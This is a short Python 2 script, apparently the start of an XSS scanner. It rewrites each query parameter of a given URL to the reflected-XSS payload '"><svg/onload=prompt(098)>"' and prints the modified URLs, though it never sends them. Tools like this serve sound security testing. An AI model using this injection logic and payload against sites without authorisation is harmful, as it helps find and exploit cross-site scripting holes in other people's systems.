#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import gevent.monkey
gevent.monkey.patch_all()

import logging
import gevent.pool
import gevent.queue
import urllib
import time
import requests
import gevent
#from BeautifulSoup import UnicodeDammit
import lxml.html
import sys
import argparse
from random import randrange
from urlparse import urlparse, parse_qs, parse_qsl
import socket
#socket.setdefaulttimeout(30)


def parse_args():
    ''' Create arguments '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL with variables to test")
    parser.add_argument("-p", "--parallel", default=500, help="Specifies how many pages you want to crawl in parallel. Default = 500")
    return parser.parse_args()

class XSS_tester:

    def __init__(self, args):
        self.url = args.url
        self.username = ''
        self.password = ''
        self.url_parser()

    def url_parser(self):
        print 'url:', self.url
        parsedUrl = urlparse(self.url)
        print 'parsed url:', parsedUrl
        print 'netloc:', parsedUrl.netloc
        path = parsedUrl.path
        print 'path', path
        hostname = parsedUrl.hostname
        print 'hostname', hostname
        protocol = parsedUrl.scheme+'://'
        print 'protocol:', protocol
        fullParams = parsedUrl.query
        print 'full params:', fullParams
        params = parse_qsl(fullParams) #parse_qsl rather than parse_ps in order to preserve order
        print 'ind. params:', params

        moddedParams = self.change_params(params)
        for p in moddedParams:
            print p

        print 'old url:', self.url
        for params in moddedParams:
            joinedParams = urllib.urlencode(params, doseq=1) # doseq takes dicts and makes them urlencoded
            print 'joined params:', joinedParams
            newUrl = protocol+hostname+path+'?'+joinedParams
            print 'new url:', newUrl

    def change_params(self, params):
        ''' Returns a list of complete parameters, each with 1 parameter changed to an XSS vector '''
        changedParams = []
        changedParam = False
        moddedParams = []
        allModdedParams = []
        for x in xrange(0, len(params)):
            for p in params:
                param = p[0]
                value = p[1]
                # If a parameter has not been modified yet
                if param not in changedParams and changedParam == False:
                    newValue = '"><svg/onload=prompt(098)>"'
                    changedParams.append(param)
                    p = (param, newValue)
                    moddedParams.append(p)
                    changedParam = True
                else:
                    moddedParams.append(p)

            # Reset so we can step through again and change a diff param
            print moddedParams
            allModdedParams.append(moddedParams)
            changedParam = False
            moddedParams = []
            #print '-----------modded params:', moddedParams

        return allModdedParams


X = XSS_tester(parse_args())
